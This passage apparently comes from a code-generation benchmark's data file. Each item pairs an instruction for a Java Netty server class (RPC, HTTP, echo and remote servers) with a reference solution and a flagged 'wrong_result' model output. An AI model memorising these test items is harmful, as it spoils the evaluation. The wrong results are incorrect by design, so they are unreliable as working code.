    "FSMID_for_test": 4,
    "wrong_result": "```java\n@Component\npublic class NettyRpcServer {\n\n    private static final int PORT = 9998;\n\n    @Autowired\n    private ServiceProvider serviceProvider;\n\n    private Channel channel;\n\n    public void start() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new IdleStateHandler(0, 0, 60, TimeUnit.SECONDS));\n                            pipeline.addLast(new RpcRequestDecoder());\n                            pipeline.addLast(new RpcResponseEncoder());\n                            pipeline.addLast(new RpcServerHandler(serviceProvider));\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            channel = bootstrap.bind(PORT).sync().channel();\n            System.out.println(\"Netty RPC server started on port \" + PORT);\n            channel.closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public void registerService(RpcServiceConfig rpcServiceConfig) {\n        serviceProvider.register(rpcServiceConfig);\n    }\n}\n```"
  },
  {
    "Task_id": 164,
    "Instruction": "Task Description: Create a Java class that implements an HTTP server using Netty framework, capable of handling HTTP requests with configurable thread pool settings and connection management.\n\nClass Description: Netty4HttpServer is a Netty-based HTTP server implementation that handles incoming HTTP requests using configurable worker threads and connection pooling. It extends AbstractServer and implements StatisticCallback for monitoring purposes.\n\nAttributes:\n- httpMessageHandler: HttpMessageHandler - Handler for processing HTTP requests\n- url: URL - Server configuration URL containing parameters like port, thread settings\n- channel: Channel - Netty channel for server communication\n- bossGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- standardThreadExecutor: StandardThreadExecutor - Thread pool for request processing\n\nMethods:\n- open() -> boolean - Initializes and starts the HTTP server, returns true if successful\n  Input: None\n  Output: boolean indicating success/failure of server startup\n\n- close(int timeout) -> void - Shuts down the server gracefully within specified timeout\n  Input: timeout - maximum time to wait for shutdown (in milliseconds)\n  Output: None\n\n- processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) -> void - Processes incoming HTTP requests\n  Input: \n    ctx - ChannelHandlerContext for the connection\n    httpRequest - Full HTTP request object\n  Output: None\n\n- sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) -> void - Sends HTTP response to client\n  Input:\n    ctx - ChannelHandlerContext for the connection\n    httpResponse - Full HTTP response object\n  Output: None\n\n- getUrl() -> URL - Returns server configuration URL\n  Input: None\n  Output: URL object containing server configuration",
    "Canonical_solution": "import com.weibo.api.motan.common.ChannelState;\nimport com.weibo.api.motan.common.MotanConstants;\nimport com.weibo.api.motan.common.URLParamType;\nimport com.weibo.api.motan.core.DefaultThreadFactory;\nimport com.weibo.api.motan.core.StandardThreadExecutor;\nimport com.weibo.api.motan.exception.MotanFrameworkException;\nimport com.weibo.api.motan.rpc.Request;\nimport com.weibo.api.motan.rpc.Response;\nimport com.weibo.api.motan.rpc.URL;\nimport com.weibo.api.motan.transport.AbstractServer;\nimport com.weibo.api.motan.transport.TransportException;\nimport com.weibo.api.motan.util.LoggerUtil;\nimport com.weibo.api.motan.util.StatisticCallback;\nimport com.weibo.api.motan.util.StatsUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.stream.ChunkedWriteHandler;\n\nimport java.net.InetSocketAddress;\n\npublic class Netty4HttpServer extends AbstractServer implements StatisticCallback {\n    private HttpMessageHandler httpMessageHandler;\n    private URL url;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private StandardThreadExecutor standardThreadExecutor;\n\n    public Netty4HttpServer(URL url, HttpMessageHandler httpMessageHandler) {\n        this.url = url;\n        this.httpMessageHandler = httpMessageHandler;\n    }\n\n    @Override\n    public synchronized boolean open() {\n        if (isAvailable()) {\n            return true;\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        if (bossGroup == null) {\n            bossGroup = new NioEventLoopGroup();\n            workerGroup = new NioEventLoopGroup();\n        }\n        boolean shareChannel = url.getBooleanParameter(URLParamType.shareChannel.getName(), URLParamType.shareChannel.getBooleanValue());\n        int workerQueueSize = url.getIntParameter(URLParamType.workerQueueSize.getName(), 500);\n\n        int minWorkerThread, maxWorkerThread;\n\n        if (shareChannel) {\n            minWorkerThread = url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MIN_WORKDER);\n            maxWorkerThread = url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MAX_WORKDER);\n        } else {\n            minWorkerThread =\n                    url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MIN_WORKDER);\n            maxWorkerThread =\n                    url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MAX_WORKDER);\n        }\n        final int maxContentLength = url.getIntParameter(URLParamType.maxContentLength.getName(), URLParamType.maxContentLength.getIntValue());\n        standardThreadExecutor = (standardThreadExecutor != null && !standardThreadExecutor.isShutdown()) ? standardThreadExecutor\n                : new StandardThreadExecutor(minWorkerThread, maxWorkerThread, workerQueueSize, new DefaultThreadFactory(\"NettyServer-\" + url.getServerPortStr(), true));\n        standardThreadExecutor.prestartAllCoreThreads();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup).channel(NioServerSocketChannel.class).childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) {\n                ch.pipeline().addLast(\"http-decoder\", new HttpRequestDecoder());\n                ch.pipeline().addLast(\"http-aggregator\", new HttpObjectAggregator(maxContentLength));\n                ch.pipeline().addLast(\"http-encoder\", new HttpResponseEncoder());\n                ch.pipeline().addLast(\"http-chunked\", new ChunkedWriteHandler());\n                ch.pipeline().addLast(\"serverHandler\", new SimpleChannelInboundHandler<FullHttpRequest>() {\n                    protected void channelRead0(final ChannelHandlerContext ctx, final FullHttpRequest httpRequest) {\n                        httpRequest.content().retain();\n                        try {\n                            standardThreadExecutor.execute(() -> processHttpRequest(ctx, httpRequest));\n                        } catch (Exception e) {\n                            LoggerUtil.error(\"request is rejected by threadPool!\", e);\n                            httpRequest.content().release();\n                            sendResponse(ctx, NettyHttpUtil.buildErrorResponse(\"request is rejected by thread pool!\"));\n                        }\n                    }\n                });\n            }\n        }).option(ChannelOption.SO_BACKLOG, 1024).childOption(ChannelOption.SO_KEEPALIVE, false);\n\n        ChannelFuture f;\n        try {\n            f = b.bind(url.getPort()).sync();\n            channel = f.channel();\n        } catch (InterruptedException e) {\n            LoggerUtil.error(\"init http server fail.\", e);\n            return false;\n        }\n        setLocalAddress((InetSocketAddress) channel.localAddress());\n        if (url.getPort() == 0) {\n            url.setPort(getLocalAddress().getPort());\n        }\n        state = ChannelState.ALIVE;\n        StatsUtil.registryStatisticCallback(this);\n        LoggerUtil.info(\"Netty4HttpServer ServerChannel finish Open: url=\" + url);\n        return true;\n    }\n\n    private void processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) {\n        FullHttpResponse httpResponse;\n        try {\n            httpRequest.headers().set(URLParamType.host.getName(), ((InetSocketAddress) ctx.channel().remoteAddress()).getAddress().getHostAddress());\n            httpResponse = httpMessageHandler.handle(this, httpRequest);\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyHttpHandler process http request fail.\", e);\n            httpResponse = NettyHttpUtil.buildErrorResponse(e.getMessage());\n        } finally {\n            httpRequest.content().release();\n        }\n        sendResponse(ctx, httpResponse);\n    }\n\n    private void sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) {\n        boolean close = false;\n        try {\n            ctx.write(httpResponse);\n            ctx.flush();\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyHttpHandler write response fail.\", e);\n            close = true;\n        } finally {\n            if (close || httpResponse == null || !httpResponse.headers().contains(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE, true)) {\n                ctx.close();\n            }\n        }\n    }\n\n    @Override\n    public synchronized void close(int timeout) {\n        if (state.isCloseState()) {\n            LoggerUtil.info(\"Netty4HttpServer close fail: already close, url={}\", url.getUri());\n            return;\n        }\n\n        if (state.isUnInitState()) {\n            LoggerUtil.info(\"Netty4HttpServer close Fail: don't need to close because node is unInit state: url={}\",\n                    url.getUri());\n            return;\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (standardThreadExecutor != null) {\n            standardThreadExecutor.shutdownNow();\n        }\n        workerGroup = null;\n        bossGroup = null;\n        standardThreadExecutor = null;\n        channel = null;\n        state = ChannelState.CLOSE;\n        StatsUtil.unRegistryStatisticCallback(this);\n    }\n\n    @Override\n    public URL getUrl() {\n        return url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class Netty4HttpServer extends AbstractServer implements StatisticCallback {\n    private final HttpMessageHandler httpMessageHandler;\n    private final URL url;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private StandardThreadExecutor standardThreadExecutor;\n\n    public Netty4HttpServer(HttpMessageHandler httpMessageHandler, URL url, StandardThreadExecutor standardThreadExecutor) {\n        this.httpMessageHandler = httpMessageHandler;\n        this.url = url;\n        this.standardThreadExecutor = standardThreadExecutor;\n    }\n\n    public boolean open() {\n        try {\n            int bossThreadCount = url.getParameter(\"bossThreads\", 1);\n            int workerThreadCount = url.getParameter(\"workerThreads\", Runtime.getRuntime().availableProcessors() * 2);\n            int connectTimeout = url.getParameter(\"connectTimeout\", 10000);\n\n            bossGroup = new NioEventLoopGroup(bossThreadCount);\n            workerGroup = new NioEventLoopGroup(workerThreadCount);\n\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<Channel>() {\n                 @Override\n                 protected void initChannel(Channel ch) {\n                     ch.pipeline().addLast(\n                         new HttpServerCodec(),\n                         new HttpObjectAggregator(65536),\n                         new ChannelInboundHandlerAdapter() {\n                             @Override\n                             public void channelRead(ChannelHandlerContext ctx, Object msg) {\n                                 if (msg instanceof FullHttpRequest) {\n                                     processHttpRequest(ctx, (FullHttpRequest) msg);\n                                 }\n                             }\n\n                             @Override\n                             public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                                 cause.printStackTrace();\n                                 ctx.close();\n                             }\n                         }\n                     );\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            channel = b.bind(url.getPort()).sync().channel();\n            return true;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public void close(int timeout) {\n        if (channel != null) {\n            channel.close().awaitUninterruptibly();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully(0, timeout, TimeUnit.MILLISECONDS);\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully(0, timeout, TimeUnit.MILLISECONDS);\n        }\n    }\n\n    public void processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) {\n        standardThreadExecutor.execute(() -> {\n            FullHttpResponse response = httpMessageHandler.handle(httpRequest);\n            sendResponse(ctx, response);\n        });\n    }\n\n    public void sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) {\n        ctx.writeAndFlush(httpResponse).addListener((ChannelFutureListener) future -> {\n            if (!future.isSuccess()) {\n                future.cause().printStackTrace();\n                future.channel().close();\n            }\n        });\n    }\n\n    public URL getUrl() {\n        return url;\n    }\n\n    @Override\n    public void onStatisticsUpdate(String statName, long value) {\n        // Implementation for statistic callback\n    }\n}"
  },
  {
    "Task_id": 166,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based HTTP server for handling RPC (Remote Procedure Call) requests. The server should manage incoming connections, process HTTP requests, and handle server lifecycle events (start/stop).\n\nClass Description: NettyHttpServer is a server implementation that uses Netty framework to create a non-blocking HTTP server capable of handling RPC requests. It manages thread pools for request processing and implements proper resource cleanup during shutdown.\n\nAttributes:\n- thread: Thread - The thread in which the Netty server runs\n- logger: Logger - Logger instance for server events (inherited from parent class)\n\nMethods:\n- start(XxlRpcProviderFactory) -> void - Starts the Netty HTTP server on a specified port, initializes thread pools, and sets up request handlers\n  - Input: xxlRpcProviderFactory - Configuration factory containing server parameters like port number and thread pool sizes\n  - Output: None (server runs asynchronously in a separate thread)\n  \n- stop() -> void - Stops the server gracefully by interrupting the server thread and shutting down all resources\n  - Input: None\n  - Output: None (performs cleanup operations)\n\nThe implementation should follow Netty best practices including:\n1. Using separate event loop groups for connection acceptance and request processing\n2. Proper channel pipeline configuration with HTTP codecs and aggregator\n3. Idle connection handling\n4. Graceful shutdown of all resources\n5. Thread pool management for request processing\n6. Proper error handling and logging",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.net.Server;\nimport com.wugui.datax.rpc.remoting.net.common.NettyConstant;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.provider.XxlRpcProviderFactory;\nimport com.wugui.datax.rpc.util.ThreadPoolUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttpServer extends Server {\n\n    private Thread thread;\n\n    @Override\n    public void start(final XxlRpcProviderFactory xxlRpcProviderFactory) {\n        thread = new Thread(() -> {\n            final ThreadPoolExecutor serverHandlerPool = ThreadPoolUtil.makeServerThreadPool(\n                    NettyHttpServer.class.getSimpleName(),\n                    xxlRpcProviderFactory.getCorePoolSize(),\n                    xxlRpcProviderFactory.getMaxPoolSize());\n            EventLoopGroup bossGroup = new NioEventLoopGroup();\n            EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n            try {\n                ServerBootstrap bootstrap = new ServerBootstrap();\n                bootstrap.group(bossGroup, workerGroup)\n                        .channel(NioServerSocketChannel.class)\n                        .childHandler(new ChannelInitializer<SocketChannel>() {\n                            @Override\n                            public void initChannel(SocketChannel channel) {\n                                channel.pipeline()\n                                        .addLast(new IdleStateHandler(0, 0, Beat.BEAT_INTERVAL * 3, TimeUnit.SECONDS))\n                                        .addLast(new HttpServerCodec())\n                                        .addLast(new HttpObjectAggregator(NettyConstant.MAX_LENGTH))\n                                        .addLast(new NettyHttpServerHandler(xxlRpcProviderFactory, serverHandlerPool));\n                            }\n                        })\n                        .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                ChannelFuture future = bootstrap.bind(xxlRpcProviderFactory.getPort()).sync();\n                logger.info(\">>>>>>>>>>> xxl-rpc remoting server start success, nettype = {}, port = {}\", NettyHttpServer.class.getName(), xxlRpcProviderFactory.getPort());\n                onStarted();\n\n                future.channel().closeFuture().sync();\n            } catch (InterruptedException e) {\n                if (e instanceof InterruptedException) {\n                    logger.info(\">>>>>>>>>>> xxl-rpc remoting server stop.\");\n                } else {\n                    logger.error(\">>>>>>>>>>> xxl-rpc remoting server error.\", e);\n                }\n            } finally {\n                try {\n                    serverHandlerPool.shutdown();\n                } catch (Exception e) {\n                    logger.error(e.getMessage(), e);\n                }\n                try {\n                    workerGroup.shutdownGracefully();\n                    bossGroup.shutdownGracefully();\n                } catch (Exception e) {\n                    logger.error(e.getMessage(), e);\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    @Override\n    public void stop() {\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        onStopped();\n        logger.info(\">>>>>>>>>>> xxl-rpc remoting server destroy success.\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyHttpServer {\n    private Thread thread;\n    private Logger logger;\n\n    public NettyHttpServer(Logger logger) {\n        this.logger = logger;\n    }\n\n    public void start(XxlRpcProviderFactory xxlRpcProviderFactory) {\n        int port = xxlRpcProviderFactory.getPort();\n        int bossGroupSize = xxlRpcProviderFactory.getBossGroupSize();\n        int workerGroupSize = xxlRpcProviderFactory.getWorkerGroupSize();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(bossGroupSize);\n        EventLoopGroup workerGroup = new NioEventLoopGroup(workerGroupSize);\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<Channel>() {\n                 @Override\n                 protected void initChannel(Channel ch) throws Exception {\n                     ChannelPipeline pipeline = ch.pipeline();\n                     pipeline.addLast(\"http-codec\", new HttpServerCodec());\n                     pipeline.addLast(\"aggregator\", new HttpObjectAggregator(65536));\n                     pipeline.addLast(\"idle-handler\", new IdleStateHandler(0, 0, 60, TimeUnit.SECONDS));\n                     pipeline.addLast(\"handler\", new RpcRequestHandler(xxlRpcProviderFactory.getThreadPoolExecutor()));\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            final ChannelFuture f = b.bind(port).sync();\n            logger.info(\"Netty HTTP server started on port {}\", port);\n\n            thread = Thread.currentThread();\n            f.channel().closeFuture().sync();\n        } catch (Exception e) {\n            logger.error(\"Failed to start Netty HTTP server\", e);\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        logger.info(\"Netty HTTP server stopped\");\n    }\n}"
  },
  {
    "Task_id": 173,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that echoes back any received messages to the client. The server should be configurable to run on any specified port and should properly handle resource cleanup during shutdown.\n\nClass Description: EchoServer is a Netty-based TCP server implementation that listens for incoming connections, processes received messages by echoing them back, and manages server lifecycle including startup and graceful shutdown.\n\nAttributes:\n- DEFAULT_PORT: int - The default port number (7) to use when no port is specified\n- bossGroup: EventLoopGroup - The parent event loop group that accepts incoming connections\n- workerGroup: EventLoopGroup - The child event loop group that handles the traffic of accepted connections\n- bootstrap: ServerBootstrap - The server bootstrap instance used to configure and start the server\n\nMethods:\n- EchoServer() -> None - Constructor that initializes the event loop groups and server bootstrap\n- start(int port) -> void - Starts the server on the specified port, configures channel options and handlers, and binds to the port\n  Input: port (int) - The port number to bind the server to\n- stop() -> void - Shuts down the event loop groups gracefully to release all resources\n- main(String[] args) -> void - Entry point that creates and starts the server instance\n  Input: args (String[]) - Command line arguments (optional port number)\n  Output: None (runs indefinitely until terminated)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class EchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws InterruptedException {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new EchoServerChannelInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"EchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = args.length > 0 ? Integer.parseInt(args[0]) : DEFAULT_PORT;\n        EchoServer server = new EchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class EchoServer {\n    private static final int DEFAULT_PORT = 7;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(new EchoServerHandler());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        EchoServer server = new EchoServer();\n        server.start(port);\n    }\n\n    private static class EchoServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ByteBuf in = (ByteBuf) msg;\n            System.out.println(\"Received: \" + in.toString(CharsetUtil.UTF_8));\n            ctx.write(in);\n        }\n\n        @Override\n        public void channelReadComplete(ChannelHandlerContext ctx) {\n            ctx.flush();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 174,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and manage communication protocols.\n\nClass Description: RemoteServer is a TCP server implementation using Netty framework that listens on a specified port, manages client connections, and maintains a list of communication protocols. It extends BaseServer for basic server functionality.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- protocolList: List<Protocol> - A list to maintain active communication protocols between clients and browsers\n\nMethods:\n- RemoteServer(int port) -> [Constructor] - Initializes the server with the specified port and creates an empty protocol list\n- listen(int port) -> void - Sets the server's listening port\n- start() -> void - Starts the Netty server, configures the server bootstrap with worker groups, channel type, and handlers, then binds to the specified port\n- findProtocolByBrowser(ChannelHandlerContext ctx) -> Protocol - Finds and returns a protocol associated with a browser's channel context\n- findProtocolByKey(String key) -> Protocol - Finds and returns a protocol associated with a specific key\n- findProtocolByClient(ChannelHandlerContext ctx) -> Protocol - Finds and returns a protocol associated with a client's channel context",
    "Canonical_solution": "import com.yeetor.androidcontrol.*;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class RemoteServer extends BaseServer {\n    private int port = -1;\n    List<Protocol> protocolList;\n\n    public RemoteServer(int port) {\n        listen(port);\n        protocolList = new LinkedList<Protocol>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childHandler(new ChildChannel(new RemoteServerWebsocketEventImp()));\n\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    private Protocol findProtocolByBrowser(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getBroswerSocket() != null && protocol.getBroswerSocket() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    private Protocol findProtocolByKey(String key) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getBroswerSocket() != null && StringUtils.equals(key, protocol.getKey())) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    private Protocol findProtocolByClient(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getClientSocket() != null && protocol.getClientSocket() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class RemoteServer extends BaseServer {\n    private int port;\n    private List<Protocol> protocolList;\n\n    public RemoteServer(int port) {\n        this.port = port;\n        this.protocolList = new ArrayList<>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new ProtocolHandler(protocolList));\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public Protocol findProtocolByBrowser(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getBrowserContext() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    public Protocol findProtocolByKey(String key) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getKey().equals(key)) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    public Protocol findProtocolByClient(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getClientContext() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n}"
  },
  {
    "Task_id": 177,
    "Instruction": "Task Description: Create a Java class that implements an embedded HTTP server using Netty framework, capable of handling HTTP requests and routing them to appropriate controller methods based on URI paths.\n\nClass Description: EmbedHttpServer is a Netty-based HTTP server implementation that provides request routing functionality to various controller methods. It supports adding custom controllers with RequestMapping annotations and handles both successful responses and error cases.\n\nAttributes:\n- port: int - The port number on which the server will listen\n- defaultController: DefaultController - The default controller to handle unmatched requests\n- controllerList: List<Object> - List of registered controller objects that handle specific routes\n- LOGGER: Logger - Logger instance for error and debug logging\n\nMethods:\n- EmbedHttpServer(int port) -> EmbedHttpServer - Constructor that initializes the server with specified port\n- invoke(String uri, Channel channel, FullHttpRequest request) -> FullHttpResponse - Routes the incoming request to the appropriate controller method based on URI matching\n- fixUri(String uri) -> String - Normalizes URI paths by ensuring proper slash formatting\n- start(GenericFutureListener startedListener) -> void - Starts the Netty server with specified configuration and event listeners\n- addController(Object obj) -> EmbedHttpServer - Registers a controller object to handle specific routes, supports method chaining",
